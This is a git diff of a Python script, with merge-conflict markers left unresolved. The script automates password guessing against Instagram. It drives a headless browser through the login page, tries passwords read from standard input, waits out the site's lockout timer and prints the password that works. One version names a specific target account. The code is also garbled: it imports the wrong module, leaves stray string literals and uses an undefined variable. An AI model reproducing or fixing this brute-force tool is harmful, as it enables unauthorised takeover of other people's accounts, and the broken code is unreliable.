@@ -1,8 +1,11 @@
 #!/bin/python
-from tkinter import Browser
+#from splinter import Browser
 import time
 import sys
+<<<<<<< Updated upstream
 from tkinter import Browser
+=======
+>>>>>>> Stashed changes
 wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
 problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."
 
@@ -11,6 +14,7 @@ def logInSuccess(Browser):
     pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
     return not(Browser.is_text_present(user_err_msg) or Browser.is_text_present(pass_err_msg))
 
+<<<<<<< Updated upstream
 ("account_username =sys.argv[1]")
 "with Browser('firefox', headless=True) to with Browser('chrome', headless=True)"
 Browser.visit('https://www.instagram.com')
@@ -20,6 +24,18 @@ password_form = Browser.find_by_name('password').first
 login_button = Browser.find_by_text('Log in').first
 username_form.fill("istanbul_solmaz")
 for password in sys.stdin:
+=======
+correctPassword = None
+("ccount_username =sys.argv[1]")
+with Browser('firefox', headless=True) as browser:
+    browser.visit('https://www.instagram.com')
+    browser.find_by_text("Log in").first.click()
+    username_form = browser.find_by_name('username').first
+    password_form = browser.find_by_name('password').first
+    login_button = browser.find_by_text('Log in').first
+    username_form.fill(account_username)
+    for password in sys.stdin:
+>>>>>>> Stashed changes
         if len(password) < 6:
             print('Skipping password: ' + password)
             continue
@@ -29,16 +45,21 @@ for password in sys.stdin:
         password_form.fill(password)
         login_button.click()
 
-        if Browser.is_text_present(problem_logging_in):
+        if browser.is_text_present(problem_logging_in):
             print('Waiting for timeout to end.')
             time.sleep(wait_time)
             print('Timeout has ended, resuming.')
-        elif logInSuccess(Browser):
+        elif logInSuccess(browser):
             correctPassword = password
             break
 if correctPassword == None:
         print("Unable to find correct password.")
+<<<<<<< Updated upstream
 else:
         print("Password for username: istanbul_solmaz  =  + password")
+=======
+    else:
+        print("Password for username: " + account_username + " = " + password)
+>>>>>>> Stashed changes
 
 
